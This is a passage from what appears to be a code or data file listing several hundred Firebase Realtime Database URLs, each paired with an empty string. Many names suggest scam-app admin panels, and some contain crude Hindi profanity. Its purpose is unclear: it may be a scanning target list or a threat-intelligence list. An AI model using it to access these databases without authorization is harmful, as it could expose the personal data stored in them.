    ("https://my-admin-07-default-rtdb.firebaseio.com", ""),
    ("https://my-admin-08-default-rtdb.firebaseio.com", ""),
    ("https://my-admin-10-default-rtdb.firebaseio.com", ""),
    ("https://my-admin-11-default-rtdb.firebaseio.com", ""),
    ("https://my-admin-50-default-rtdb.firebaseio.com", ""),
    ("https://my-admin-51-default-rtdb.firebaseio.com", ""),
    ("https://pm-admin1-default-rtdb.firebaseio.com", ""),
    ("https://pmadmin20-default-rtdb.firebaseio.com", ""),
    ("https://rtadmin2-default-rtdb.firebaseio.com", ""),
    ("https://lo-bhai-default-rtdb.firebaseio.com", ""),
    ("https://rp-boss-default-rtdb.firebaseio.com", ""),
    ("https://pmadmin124-default-rtdb.firebaseio.com", ""),
    ("https://pmadmins16-default-rtdb.firebaseio.com", ""),
    ("https://yamraj-22-default-rtdb.firebaseio.com", ""),
    ("https://puja-ji-default-rtdb.firebaseio.com", ""),
    ("https://sabji4-default-rtdb.firebaseio.com", ""),
    ("https://sabji6-default-rtdb.firebaseio.com", ""),
    ("https://sabji7-default-rtdb.firebaseio.com", ""),
    ("https://anandi-admin-default-rtdb.firebaseio.com", ""),
    ("https://saniapanel-default-rtdb.firebaseio.com", ""),
    ("https://urmila-ji12-default-rtdb.firebaseio.com", ""),
    ("https://rekha-ji-97-default-rtdb.firebaseio.com", ""),
    ("https://ikkapanel-default-rtdb.firebaseio.com", ""),
    ("https://apna-admin-panel-default-rtdb.firebaseio.com", ""),
    ("https://mithun786-default-rtdb.firebaseio.com", ""),
    ("https://scout-op-default-rtdb.firebaseio.com", ""),
    ("https://yellow-panel-admin-default-rtdb.firebaseio.com", ""),
    ("https://pikachu-panel-default-rtdb.firebaseio.com", ""),
    ("https://yellowpanel-default-rtdb.firebaseio.com", ""),
    ("https://red055-default-rtdb.firebaseio.com", ""),
    ("https://admin-005-default-rtdb.firebaseio.com", ""),
    ("https://rahul-g11-default-rtdb.firebaseio.com", ""),
    ("https://arvind-kumar-26-default-rtdb.firebaseio.com", ""),
    ("https://jyotirlinga-default-rtdb.firebaseio.com", ""),
    ("https://mama-ji-09-default-rtdb.firebaseio.com", ""),
    ("https://salaji1-default-rtdb.firebaseio.com", ""),
    ("https://sanjay-da-default-rtdb.firebaseio.com", ""),
    ("https://chandan-da-default-rtdb.firebaseio.com", ""),
    ("https://uttam-da-21-default-rtdb.firebaseio.com", ""),
    ("https://uttamda-default-rtdb.firebaseio.com", ""),
    ("https://pawan-da-default-rtdb.firebaseio.com", ""),
    ("https://mukesh-da-default-rtdb.firebaseio.com", ""),
    ("https://vikash-da-default-rtdb.firebaseio.com", ""),
    ("https://pankaj-da-default-rtdb.firebaseio.com", ""),
    ("https://sunil-da-default-rtdb.firebaseio.com", ""),
    ("https://anita-girl-default-rtdb.firebaseio.com", ""),
    ("https://daddy-admin-default-rtdb.firebaseio.com", ""),
    ("https://kgf-admin-2-default-rtdb.firebaseio.com", ""),
    ("https://op-admin-panel-default-rtdb.firebaseio.com", ""),
    ("https://jamun-admin1-default-rtdb.firebaseio.com", ""),
    ("https://babygirl0-default-rtdb.firebaseio.com", ""),
    ("https://raj-developer-3-default-rtdb.firebaseio.com", ""),
    ("https://kamal-guru-default-rtdb.firebaseio.com", ""),
    ("https://krish-hacker-default-rtdb.firebaseio.com", ""),
    ("https://ashish-master-default-rtdb.firebaseio.com", ""),
    ("https://raju-hacker-default-rtdb.firebaseio.com", ""),
    ("https://anita-guru-default-rtdb.firebaseio.com", ""),
    ("https://anand-god-default-rtdb.firebaseio.com", ""),
    ("https://princebabu-default-rtdb.firebaseio.com", ""),
    ("https://tarzan-panel-default-rtdb.firebaseio.com", ""),
    ("https://bhandari2-default-rtdb.firebaseio.com", ""),
    ("https://raj-admin02-default-rtdb.firebaseio.com", ""),
    ("https://raya-ji-default-rtdb.firebaseio.com", ""),
    ("https://yoga-baba-default-rtdb.firebaseio.com", ""),
    ("https://mamu-hacker-default-rtdb.firebaseio.com", ""),
    ("https://mithai-panel-default-rtdb.firebaseio.com", ""),
    ("https://dophar-panel-default-rtdb.firebaseio.com", ""),
    ("https://mical-admin-default-rtdb.firebaseio.com", ""),
    ("https://gotam-admin-default-rtdb.firebaseio.com", ""),
    ("https://yuman-admin-default-rtdb.firebaseio.com", ""),
    ("https://sewak-panel-default-rtdb.firebaseio.com", ""),
    ("https://jadoo-panel-default-rtdb.firebaseio.com", ""),
    ("https://null-admin-default-rtdb.firebaseio.com", ""),
    ("https://roniji-default-rtdb.firebaseio.com", ""),
    ("https://nonuwala-default-rtdb.firebaseio.com", ""),
    ("https://sivabhai-default-rtdb.firebaseio.com", ""),
    ("https://carore-panel-default-rtdb.firebaseio.com", ""),
    ("https://zorkwala-default-rtdb.firebaseio.com", ""),
    ("https://youbabu-default-rtdb.firebaseio.com", ""),
    ("https://subhuji-default-rtdb.firebaseio.com", ""),
    ("https://milano-panel-default-rtdb.firebaseio.com", ""),
    ("https://horuspanel-default-rtdb.firebaseio.com", ""),
    ("https://pelanadmin-default-rtdb.firebaseio.com", ""),
    ("https://nirajadmin-default-rtdb.firebaseio.com", ""),
    ("https://sandeep-panel-default-rtdb.firebaseio.com", ""),
    ("https://bablu-11-default-rtdb.firebaseio.com", ""),
    ("https://lakhan-7-default-rtdb.firebaseio.com", ""),
    ("https://csc211-default-rtdb.firebaseio.com", ""),
    ("https://rokeyadmin-default-rtdb.firebaseio.com", ""),
    ("https://tuntunadmin-default-rtdb.firebaseio.com", ""),
    ("https://hatelapanel-default-rtdb.firebaseio.com", ""),
    ("https://hirukapanel-default-rtdb.firebaseio.com", ""),
    ("https://kokilaadmin-default-rtdb.firebaseio.com", ""),
    ("https://rawan-ji-default-rtdb.firebaseio.com", ""),
    ("https://sk1242-default-rtdb.firebaseio.com", ""),
    ("https://anand-ji-default-rtdb.firebaseio.com", ""),
    ("https://white-ji-default-rtdb.firebaseio.com", ""),
    ("https://ankit-guru-default-rtdb.firebaseio.com", ""),
    ("https://ashish-amit-default-rtdb.firebaseio.com", ""),
    ("https://baba-admin-10-default-rtdb.firebaseio.com", ""),
    ("https://pankaj-vijay-default-rtdb.firebaseio.com", ""),
    ("https://anuj-sadhu-default-rtdb.firebaseio.com", ""),
    ("https://kartik-sadhu-default-rtdb.firebaseio.com", ""),
    ("https://rakesh-anil-default-rtdb.firebaseio.com", ""),
    ("https://papu-raj-default-rtdb.firebaseio.com", ""),
    ("https://ram-bhaiya-default-rtdb.firebaseio.com", ""),
    ("https://ramu-bhaiya-default-rtdb.firebaseio.com", ""),
    ("https://raj-pappu-default-rtdb.firebaseio.com", ""),
    ("https://raja-mishra-default-rtdb.firebaseio.com", ""),
    ("https://ashish-bihar-default-rtdb.firebaseio.com", ""),
    ("https://bablu-boss-default-rtdb.firebaseio.com", ""),
    ("https://amit-beta-default-rtdb.firebaseio.com", ""),
    ("https://anmol-rani-default-rtdb.firebaseio.com", ""),
    ("https://sunil-beta-default-rtdb.firebaseio.com", ""),
    ("https://mahi-rani-default-rtdb.firebaseio.com", ""),
    ("https://rahul-baby-default-rtdb.firebaseio.com", ""),
    ("https://riya-bhabhi-default-rtdb.firebaseio.com", ""),
    ("https://naina-singh-default-rtdb.firebaseio.com", ""),
    ("https://mahika-sharma-default-rtdb.firebaseio.com", ""),
    ("https://vinod-bhojpuri-default-rtdb.firebaseio.com", ""),
    ("https://gateway-panel-default-rtdb.firebaseio.com", ""),
    ("https://niraj-2-default-rtdb.firebaseio.com", ""),
    ("https://admin-v31-default-rtdb.firebaseio.com", ""),
    ("https://sk-admin-v2-default-rtdb.firebaseio.com", ""),
    ("https://sk-admin-v6-default-rtdb.firebaseio.com", ""),
    ("https://sk-admin-v7-default-rtdb.firebaseio.com", ""),
    ("https://my-admin-500-default-rtdb.firebaseio.com", ""),
    ("https://naina1-default-rtdb.firebaseio.com", ""),
    ("https://tigerbaba-default-rtdb.firebaseio.com", ""),
    ("https://rahul-new-97-default-rtdb.firebaseio.com", ""),
    ("https://my-new-88-default-rtdb.firebaseio.com", ""),
    ("https://rohan-new-94-default-rtdb.firebaseio.com", ""),
    ("https://bihari-mamu-default-rtdb.firebaseio.com", ""),
    ("https://apna-new-24-default-rtdb.firebaseio.com", ""),
    ("https://vijay-new-86-default-rtdb.firebaseio.com", ""),
    ("https://mithun-new-91-default-rtdb.firebaseio.com", ""),
    ("https://mithun-ka-130-default-rtdb.firebaseio.com", ""),
    ("https://mithun-ka-108-default-rtdb.firebaseio.com", ""),
    ("https://nirajadmin2-default-rtdb.firebaseio.com", ""),
    ("https://ashish-bihar80-default-rtdb.firebaseio.com", ""),
    ("https://ashish-bihar-78-default-rtdb.firebaseio.com", ""),
    ("https://arvind-v1-default-rtdb.firebaseio.com", ""),
    ("https://null-admin-17-default-rtdb.firebaseio.com", ""),
    ("https://nirajadmin1-default-rtdb.firebaseio.com", ""),
    ("https://raj-admin-raj-default-rtdb.firebaseio.com", ""),
    ("https://pintu-admin-panel-default-rtdb.firebaseio.com", ""),
    ("https://mukesh-da-new-default-rtdb.firebaseio.com", ""),
    ("https://sanjay-da-new-default-rtdb.firebaseio.com", ""),
    ("https://ramu-admin-panel-default-rtdb.firebaseio.com", ""),
    ("https://vikash-da-new-default-rtdb.firebaseio.com", ""),
    ("https://pmadminpanel-default-rtdb.firebaseio.com", ""),
    ("https://rohan-admin-panel-default-rtdb.firebaseio.com", ""),
    ("https://pappu-da-new-default-rtdb.firebaseio.com", ""),
    ("https://mahi-admin-panel-default-rtdb.firebaseio.com", ""),
    ("https://mithun-da-default-rtdb.firebaseio.com", ""),
    ("https://vikash-admin-default-rtdb.firebaseio.com", ""),
    ("https://apnanull-default-rtdb.firebaseio.com", ""),
    ("https://apna-mera-default-rtdb.firebaseio.com", ""),
    ("https://mukesh-null-default-rtdb.firebaseio.com", ""),
    ("https://munnabhaiya-default-rtdb.firebaseio.com", ""),
    ("https://rakesh-apna-default-rtdb.firebaseio.com", ""),
    ("https://rajkumarx-default-rtdb.firebaseio.com", ""),
    ("https://rekhal-default-rtdb.firebaseio.com", ""),
    ("https://puja37-default-rtdb.firebaseio.com", ""),
    ("https://ruhixx-default-rtdb.firebaseio.com", ""),
    ("https://anilmm-default-rtdb.firebaseio.com", ""),
    ("https://manishpo-default-rtdb.firebaseio.com", ""),
    ("https://rajkumarrr-default-rtdb.firebaseio.com", ""),
    ("https://rajhhh-default-rtdb.firebaseio.com", ""),
    ("https://sameerrrr-default-rtdb.firebaseio.com", ""),
    ("https://vikashhhh-default-rtdb.firebaseio.com", ""),
    ("https://apnappppp-default-rtdb.firebaseio.com", ""),
    ("https://rajiiii-default-rtdb.firebaseio.com", ""),
    ("https://rajiiiiii-default-rtdb.firebaseio.com", ""),
    ("https://rajlllll-default-rtdb.firebaseio.com", ""),
    ("https://krishhh-default-rtdb.firebaseio.com", ""),
    ("https://vivo15-default-rtdb.firebaseio.com", ""),
    ("https://kenstar3-default-rtdb.firebaseio.com", ""),
    ("https://kenstar4-default-rtdb.firebaseio.com", ""),
    ("https://apna2605-default-rtdb.firebaseio.com", ""),
    ("https://pmkisan-admin-default-rtdb.firebaseio.com", ""),
    ("https://bipuladmin-default-rtdb.firebaseio.com", ""),
    ("https://ranipanel-default-rtdb.firebaseio.com", ""),
    ("https://chandan-da30-default-rtdb.firebaseio.com", ""),
    ("https://vikash-da-new-98-default-rtdb.firebaseio.com", ""),
    ("https://sk-admin-v8-default-rtdb.firebaseio.com", ""),
    ("https://sk-admin-v11-default-rtdb.firebaseio.com", ""),
    ("https://sk-admin-v9-default-rtdb.firebaseio.com", ""),
    ("https://rajuadmin12-default-rtdb.firebaseio.com", ""),
    ("https://sk-admin-v12-default-rtdb.firebaseio.com", ""),
    ("https://my-admin-550-default-rtdb.firebaseio.com", ""),
    ("https://babluiiiii-default-rtdb.firebaseio.com", ""),
    ("https://ravi-hack-default-rtdb.firebaseio.com", ""),
    ("https://hacking-ram-default-rtdb.firebaseio.com", ""),
    ("https://hacking-abhi-default-rtdb.firebaseio.com", ""),
    ("https://yt-khan-default-rtdb.firebaseio.com", ""),
    ("https://hacking-suman-default-rtdb.firebaseio.com", ""),
    ("https://alok-ji-default-rtdb.firebaseio.com", ""),
    ("https://bikram-bhai-default-rtdb.firebaseio.com", ""),
    ("https://raunak-panel-default-rtdb.firebaseio.com", ""),
    ("https://aadi-hacker-default-rtdb.firebaseio.com", ""),
    ("https://anup-babu-default-rtdb.firebaseio.com", ""),
    ("https://ram-kamal-default-rtdb.firebaseio.com", ""),
    ("https://professor-raj-default-rtdb.firebaseio.com", ""),
    ("https://professor99-default-rtdb.firebaseio.com", ""),
    ("https://shiv-sir-default-rtdb.firebaseio.com", ""),
    ("https://rakeshi-default-rtdb.firebaseio.com", ""),
    ("https://yellow-panel-02-default-rtdb.firebaseio.com", ""),
    ("https://raj-admin-b-default-rtdb.firebaseio.com", ""),
    ("https://hacking-01-default-rtdb.firebaseio.com", ""),
    ("https://m-admin-3-default-rtdb.firebaseio.com", ""),
    ("https://m-admin-4-default-rtdb.firebaseio.com", ""),
    ("https://m-admin-17-default-rtdb.firebaseio.com", ""),
    ("https://m-admin-70-default-rtdb.firebaseio.com", ""),
    ("https://m-admin-74-default-rtdb.firebaseio.com", ""),
    ("https://m-admin-75-default-rtdb.firebaseio.com", ""),
    ("https://m-admin-79-default-rtdb.firebaseio.com", ""),
    ("https://green-panel-01-default-rtdb.firebaseio.com", ""),
    ("https://mamu-2-default-rtdb.firebaseio.com", ""),
    ("https://my-admin-504-default-rtdb.firebaseio.com", ""),
    ("https://my-admin-551-default-rtdb.firebaseio.com", ""),
    ("https://my-admin-552-default-rtdb.firebaseio.com", ""),
    ("https://my-admin-554-default-rtdb.firebaseio.com", ""),
    ("https://my-admin-555-default-rtdb.firebaseio.com", ""),
    ("https://rahul246-default-rtdb.firebaseio.com", ""),
    ("https://sk-admin-v13-default-rtdb.firebaseio.com", ""),
    ("https://my-admin-553-default-rtdb.firebaseio.com", ""),
    ("https://ashish-amit-k-default-rtdb.firebaseio.com", ""),
    ("https://ck-babu-default-rtdb.firebaseio.com", ""),
    ("https://hacking-wala-default-rtdb.firebaseio.com", ""),
    ("https://pikachu-admin-default-rtdb.firebaseio.com", ""),
    ("https://pvt-panelx-default-rtdb.firebaseio.com", ""),
    ("https://vikash-mamu-default-rtdb.firebaseio.com", ""),
    ("https://yellow-panel-m-default-rtdb.firebaseio.com", ""),
    ("https://ali-rustam-default-rtdb.firebaseio.com", ""),
    ("https://ashish-amit-ka-default-rtdb.firebaseio.com", ""),
    ("https://goutam-mithun-default-rtdb.firebaseio.com", ""),
    ("https://my-admin-558-default-rtdb.firebaseio.com", ""),
    ("https://pikachu-admins-default-rtdb.firebaseio.com", ""),
    ("https://vikash-mamu-2-default-rtdb.firebaseio.com", ""),
    ("https://fudadmin1-default-rtdb.firebaseio.com", ""),
    ("https://admin-panelx-default-rtdb.firebaseio.com", ""),
    ("https://newpanel12-default-rtdb.firebaseio.com", ""),
    ("https://raniiii-default-rtdb.firebaseio.com", ""),
    ("https://ashwinji1-default-rtdb.firebaseio.com", ""),
    ("https://premadmin1-default-rtdb.firebaseio.com", ""),
    ("https://rto-yadav-default-rtdb.firebaseio.com", ""),
    ("https://raja-c-default-rtdb.firebaseio.com", ""),
    ("https://vickyadmin2-default-rtdb.firebaseio.com", ""),
    ("https://my-r-12-default-rtdb.firebaseio.com", ""),
    ("https://raja-c-2-default-rtdb.firebaseio.com", ""),
    ("https://ramu-c25-default-rtdb.firebaseio.com", ""),
    ("https://vickyadmin45-default-rtdb.firebaseio.com", ""),
    ("https://anika-kabir-default-rtdb.firebaseio.com", ""),
    ("https://barun-new-default-rtdb.firebaseio.com", ""),
    ("https://dheeraj-papa-default-rtdb.firebaseio.com", ""),
    ("https://pritamadmin-default-rtdb.firebaseio.com", ""),
    ("https://ryanpanel-default-rtdb.firebaseio.com", ""),
    ("https://shekhar-admin-default-rtdb.firebaseio.com", ""),
    ("https://sultankumar-default-rtdb.firebaseio.com", ""),
    ("https://yashesh9-default-rtdb.firebaseio.com", ""),
    ("https://lucky-papa-default-rtdb.firebaseio.com", ""),
    ("https://sachin-sala-default-rtdb.firebaseio.com", ""),
    ("https://kumar-sajan-default-rtdb.firebaseio.com", ""),
    ("https://chandan-ka-sala-default-rtdb.firebaseio.com", ""),
    ("https://my-admin-556-default-rtdb.firebaseio.com", ""),
    ("https://my-admin-557-default-rtdb.firebaseio.com", ""),
    ("https://my-admin-604-default-rtdb.firebaseio.com", ""),
    ("https://ravi-mamu-default-rtdb.firebaseio.com", ""),
    ("https://sajan-mamu-default-rtdb.firebaseio.com", ""),
    ("https://sk-admin-v14-default-rtdb.firebaseio.com", ""),
    ("https://sk-admin-v16-default-rtdb.firebaseio.com", ""),
    ("https://sk-admin-v19-default-rtdb.firebaseio.com", ""),
    ("https://sk-admin-v20-default-rtdb.firebaseio.com", ""),
    ("https://vikash-da-sala-default-rtdb.firebaseio.com", ""),
    ("https://ambanii-default-rtdb.firebaseio.com", ""),
    ("https://bishnu-137-default-rtdb.firebaseio.com", ""),
    ("https://ramesh445-default-rtdb.firebaseio.com", ""),
    ("https://manish-admin-default-rtdb.firebaseio.com", ""),
    ("https://shivamji2-default-rtdb.firebaseio.com", ""),
    ("https://shivamji4-default-rtdb.firebaseio.com", ""),
    ("https://jitendraji00-default-rtdb.firebaseio.com", ""),
    ("https://puja534-default-rtdb.firebaseio.com", ""),
    ("https://deepika-admin-default-rtdb.firebaseio.com", ""),
    ("https://satyamadmin50-default-rtdb.firebaseio.com", ""),
    ("https://csk-admin-default-rtdb.firebaseio.com", ""),
    ("https://lalu-d-default-rtdb.firebaseio.com", ""),
    ("https://rto-chalan-e-default-rtdb.firebaseio.com", ""),
    ("https://bikash-66-default-rtdb.firebaseio.com", ""),
    ("https://adam-sir-default-rtdb.firebaseio.com", ""),
    ("https://alex-aryan-default-rtdb.firebaseio.com", ""),
    ("https://oliver-admin-default-rtdb.firebaseio.com", ""),
    ("https://ash-papa-default-rtdb.firebaseio.com", ""),
    ("https://clint-raj-default-rtdb.firebaseio.com", ""),
    ("https://mistyrani-default-rtdb.firebaseio.com", ""),
    ("https://jackson-panel-default-rtdb.firebaseio.com", ""),
    ("https://skyler-1-default-rtdb.firebaseio.com", ""),
    ("https://skyler-admin-default-rtdb.firebaseio.com", ""),
    ("https://admin-clint-default-rtdb.firebaseio.com", ""),
    ("https://clintmayank-default-rtdb.firebaseio.com", ""),
    ("https://chandan-dada-default-rtdb.firebaseio.com", ""),
    ("https://panelllll-default-rtdb.firebaseio.com", ""),
    ("https://rto-raj-default-rtdb.firebaseio.com", ""),
    ("https://subhujiiiiiiii-default-rtdb.firebaseio.com", ""),
    ("https://jiooooo-default-rtdb.firebaseio.com", ""),
    ("https://mohanadminii-default-rtdb.firebaseio.com", ""),
    ("https://mangallllll-default-rtdb.firebaseio.com", ""),
    ("https://rahulkrr-default-rtdb.firebaseio.com", ""),
    ("https://priyanshuu-default-rtdb.firebaseio.com", ""),
    ("https://mangaaal-default-rtdb.firebaseio.com", ""),
    ("https://apna-ne-default-rtdb.firebaseio.com", ""),
    ("https://raj-bhaii-panel-default-rtdb.firebaseio.com", ""),
    ("https://rrrahul-default-rtdb.firebaseio.com", ""),
    ("https://sanjayyy1-default-rtdb.firebaseio.com", ""),
    ("https://ash-paapa-default-rtdb.firebaseio.com", ""),
    ("https://aanup-kumar-default-rtdb.firebaseio.com", ""),
    ("https://admin-ak-default-rtdb.firebaseio.com", ""),
    ("https://admin-gru-default-rtdb.firebaseio.com", ""),
    ("https://admin-paneel-default-rtdb.firebaseio.com", ""),
    ("https://bikas-admin-default-rtdb.firebaseio.com", ""),
    ("https://csk-adimn-default-rtdb.firebaseio.com", ""),
    ("https://dk-panel-default-rtdb.firebaseio.com", ""),
    ("https://gudu-kumar-default-rtdb.firebaseio.com", ""),
    ("https://mastepanel-default-rtdb.firebaseio.com", ""),
    ("https://mypanl-default-rtdb.firebaseio.com", ""),
    ("https://newpanle-default-rtdb.firebaseio.com", ""),
    ("https://rahulbhi-default-rtdb.firebaseio.com", ""),
    ("https://rajeshpannel-default-rtdb.firebaseio.com", ""),
    ("https://rajivbhi-default-rtdb.firebaseio.com", ""),
    ("https://ranisi-default-rtdb.firebaseio.com", ""),
    ("https://rehaadmin-default-rtdb.firebaseio.com", ""),
    ("https://rtoadminn-default-rtdb.firebaseio.com", ""),
    ("https://rtoopanel-default-rtdb.firebaseio.com", ""),
    ("https://sbiama-default-rtdb.firebaseio.com", ""),
    ("https://payaji-default-rtdb.firebaseio.com", ""),
    ("https://rohnahacker-default-rtdb.firebaseio.com", ""),
    ("https://ajit-penal-default-rtdb.firebaseio.com", ""),
    ("https://arvind-babau-default-rtdb.firebaseio.com", ""),
    ("https://ashapenal-default-rtdb.firebaseio.com", ""),
    ("https://bikrampenal-default-rtdb.firebaseio.com", ""),
    ("https://chhoto-default-rtdb.firebaseio.com", ""),
    ("https://gulashanbeta-default-rtdb.firebaseio.com", ""),
    ("https://kumarkumari-default-rtdb.firebaseio.com", ""),
    ("https://mahavir-panell-default-rtdb.firebaseio.com", ""),
    ("https://mithun-penal-default-rtdb.firebaseio.com", ""),
    ("https://mypanal-default-rtdb.firebaseio.com", ""),
    ("https://nayapenal-default-rtdb.firebaseio.com", ""),
    ("https://newpanal-default-rtdb.firebaseio.com", ""),
    ("https://newpanll-default-rtdb.firebaseio.com", ""),
    ("https://new-penal-default-rtdb.firebaseio.com", ""),
    ("https://newpnl-default-rtdb.firebaseio.com", ""),
    ("https://nyapnl-default-rtdb.firebaseio.com", ""),
    ("https://panelall-default-rtdb.firebaseio.com", ""),
    ("https://pannel-jeet-default-rtdb.firebaseio.com", ""),
    ("https://penal-ajit-default-rtdb.firebaseio.com", ""),
    ("https://radha-kumari-default-rtdb.firebaseio.com", ""),
    ("https://radhe-penal-default-rtdb.firebaseio.com", ""),
    ("https://raju-gru-default-rtdb.firebaseio.com", ""),
    ("https://raju-penal-default-rtdb.firebaseio.com", ""),
    ("https://ramesh-penal-default-rtdb.firebaseio.com", ""),
    ("https://ram-kuma-default-rtdb.firebaseio.com", ""),
    ("https://ram-panell-default-rtdb.firebaseio.com", ""),
    ("https://ranikumari-default-rtdb.firebaseio.com", ""),
    ("https://riyansh-admin-default-rtdb.firebaseio.com", ""),
    ("https://rohan-pannel-default-rtdb.firebaseio.com", ""),
    ("https://skpenal-default-rtdb.firebaseio.com", ""),
    ("https://subhashadminu-default-rtdb.firebaseio.com", ""),
    ("https://subhu-jiiiii-default-rtdb.firebaseio.com", ""),
    ("https://sunny-gru-default-rtdb.firebaseio.com", ""),
    ("https://tinku-pannel-default-rtdb.firebaseio.com", ""),
    ("https://vikrampenal-default-rtdb.firebaseio.com", ""),
    ("https://vraj-bhai-default-rtdb.firebaseio.com", ""),
    ("https://boos-kumar-default-rtdb.firebaseio.com", ""),
    ("https://hemant-panal-default-rtdb.firebaseio.com", ""),
    ("https://jatin-panal-default-rtdb.firebaseio.com", ""),
    ("https://panal-bittu-default-rtdb.firebaseio.com", ""),
    ("https://rajpanal-default-rtdb.firebaseio.com", ""),
    ("https://amitpannel1-default-rtdb.firebaseio.com", ""),
    ("https://amitpannel8-default-rtdb.firebaseio.com", ""),
    ("https://apna-panal-default-rtdb.firebaseio.com", ""),
    ("https://mera-penal-default-rtdb.firebaseio.com", ""),
    ("https://pannel10-default-rtdb.firebaseio.com", ""),
    ("https://penal1-default-rtdb.firebaseio.com", ""),
    ("https://penal2-default-rtdb.firebaseio.com", ""),
    ("https://penal6-default-rtdb.firebaseio.com", ""),
    ("https://penal7-default-rtdb.firebaseio.com", ""),
    ("https://dk-penal-default-rtdb.firebaseio.com", ""),
    ("https://mypanal3-default-rtdb.firebaseio.com", ""),
    ("https://mypenal-7-default-rtdb.firebaseio.com", ""),
    ("https://newpennal-default-rtdb.firebaseio.com", ""),
    ("https://panal7-default-rtdb.firebaseio.com", ""),
    ("https://penal62-default-rtdb.firebaseio.com", ""),
    ("https://penal-new1-default-rtdb.firebaseio.com", ""),
    ("https://admi-penal-default-rtdb.firebaseio.com", ""),
    ("https://my-panl2-default-rtdb.firebaseio.com", ""),
    ("https://alex-penal-default-rtdb.firebaseio.com", ""),
    ("https://arvind-babau-2-default-rtdb.firebaseio.com", ""),
    ("https://bhai-penal-default-rtdb.firebaseio.com", ""),
    ("https://fir-penal-default-rtdb.firebaseio.com", ""),
    ("https://lund-panl-default-rtdb.firebaseio.com", ""),
    ("https://lund-penal-default-rtdb.firebaseio.com", ""),
    ("https://raja-penal-default-rtdb.firebaseio.com", ""),
    ("https://rcb-penal-default-rtdb.firebaseio.com", ""),
    ("https://raja-panell-default-rtdb.firebaseio.com", ""),
    ("https://ramu-penal-default-rtdb.firebaseio.com", ""),
    ("https://pikachu-penal-default-rtdb.firebaseio.com", ""),
    ("https://chodu-penal-default-rtdb.firebaseio.com", ""),
    ("https://don-pannel-default-rtdb.firebaseio.com", ""),
    ("https://don-penal-default-rtdb.firebaseio.com", ""),
    ("https://dotpannel-default-rtdb.firebaseio.com", ""),
    ("https://gandukumar-default-rtdb.firebaseio.com", ""),
    ("https://gul-penal-default-rtdb.firebaseio.com", ""),
    ("https://kamina-penal-default-rtdb.firebaseio.com", ""),
    ("https://loda-penal-default-rtdb.firebaseio.com", ""),
    ("https://new-randi-default-rtdb.firebaseio.com", ""),
    ("https://penal-chor-default-rtdb.firebaseio.com", ""),
    ("https://randipenal-default-rtdb.firebaseio.com", ""),
    ("https://doknew-default-rtdb.firebaseio.com", ""),
    ("https://rajapenal-default-rtdb.firebaseio.com", ""),
    ("https://admin-apna-default-rtdb.firebaseio.com", ""),
    ("https://desipannel-default-rtdb.firebaseio.com", ""),
    ("https://kgfpenal-default-rtdb.firebaseio.com", ""),
    ("https://king-bihari-default-rtdb.firebaseio.com", ""),
    ("https://madarchodpanle-default-rtdb.firebaseio.com", ""),
    ("https://panalloda-default-rtdb.firebaseio.com", ""),
    ("https://ex-pannel-default-rtdb.firebaseio.com", ""),
    ("https://kumar-bf-default-rtdb.firebaseio.com", ""),
    ("https://murga-panel-default-rtdb.firebaseio.com", ""),
    ("https://panel-rrr-default-rtdb.firebaseio.com", ""),
    ("https://queenji-default-rtdb.firebaseio.com", ""),
    ("https://teacher-pannel-default-rtdb.firebaseio.com", ""),
    ("https://admin-raj-default-rtdb.firebaseio.com", ""),
    ("https://admin-sonu-default-rtdb.firebaseio.com", ""),
    ("https://bhabhi-chut-default-rtdb.firebaseio.com", ""),
    ("https://boss-ramesh-default-rtdb.firebaseio.com", ""),
    ("https://rahul248-default-rtdb.firebaseio.com", ""),
    ("https://skdost1-default-rtdb.firebaseio.com", ""),
    ("https://rani-randi-default-rtdb.firebaseio.com", ""),
    ("https://anjay-admin-default-rtdb.firebaseio.com", ""),
    ("https://kkrradmin-default-rtdb.firebaseio.com", ""),
    ("https://admin-olx-default-rtdb.firebaseio.com", ""),
    ("https://hospital20-default-rtdb.firebaseio.com", ""),
    ("https://hospitalpanel0-default-rtdb.firebaseio.com", ""),
    ("https://pannelpan-default-rtdb.firebaseio.com", ""),
    ("https://meraloda-default-rtdb.firebaseio.com", ""),
    ("https://ram-admin-panel-default-rtdb.firebaseio.com", ""),
    ("https://ashisadmin-default-rtdb.firebaseio.com", ""),
    ("https://admin-ak-1-default-rtdb.firebaseio.com", ""),
    ("https://admin-pannel-2-default-rtdb.firebaseio.com", ""),
    ("https://hospital-17-default-rtdb.firebaseio.com", ""),
    ("https://hospital-18-default-rtdb.firebaseio.com", ""),
    ("https://my-panel-23-default-rtdb.firebaseio.com", ""),
    ("https://randipenal123-default-rtdb.firebaseio.com", ""),
    ("https://sk-admin-v21-default-rtdb.firebaseio.com", ""),
    ("https://sk-admin-v22-default-rtdb.firebaseio.com", ""),
    ("https://sk-admin-v23-default-rtdb.firebaseio.com", ""),
    ("https://sk-admin-v24-default-rtdb.firebaseio.com", ""),
    ("https://sk-admin-v25-default-rtdb.firebaseio.com", ""),
    ("https://sk-admin-v26-default-rtdb.firebaseio.com", ""),
    ("https://sk-admin-v28-default-rtdb.firebaseio.com", ""),
    ("https://sk-admin-v29-default-rtdb.firebaseio.com", ""),
    ("https://sk-admin-v3-default-rtdb.firebaseio.com", ""),
    ("https://skpenal-352-default-rtdb.firebaseio.com", ""),
    ("https://admin-penal-302-default-rtdb.firebaseio.com", ""),
    ("https://bikash-penal-default-rtdb.firebaseio.com", ""),
    ("https://csk-panal-default-rtdb.firebaseio.com", ""),
    ("https://daku746-default-rtdb.firebaseio.com", ""),
    ("https://goutam-panal-default-rtdb.firebaseio.com", ""),
    ("https://karu-ji-default-rtdb.firebaseio.com", ""),
    ("https://love-penal-default-rtdb.firebaseio.com", ""),
    ("https://madan-panel-default-rtdb.firebaseio.com", ""),
    ("https://manuji-default-rtdb.firebaseio.com", ""),
    ("https://mukesh-da-35-default-rtdb.firebaseio.com", ""),
    ("https://puja57-default-rtdb.firebaseio.com", ""),
    ("https://randi776-default-rtdb.firebaseio.com", ""),
    ("https://sadhu-ji-default-rtdb.firebaseio.com", ""),
    ("https://sanjay-bhai-34-default-rtdb.firebaseio.com", ""),
    ("https://anjit-admin-default-rtdb.firebaseio.com", ""),
    ("https://bablu-kumar-33-default-rtdb.firebaseio.com", ""),
    ("https://iphone-penal-default-rtdb.firebaseio.com", ""),
    ("https://karu1130-default-rtdb.firebaseio.com", ""),
    ("https://legend-pannel-66-default-rtdb.firebaseio.com", ""),
    ("https://raj1999-default-rtdb.firebaseio.com", ""),
    ("https://rajeshadmin1994-default-rtdb.firebaseio.com", ""),
    ("https://rama-admin-panel-default-rtdb.firebaseio.com", ""),
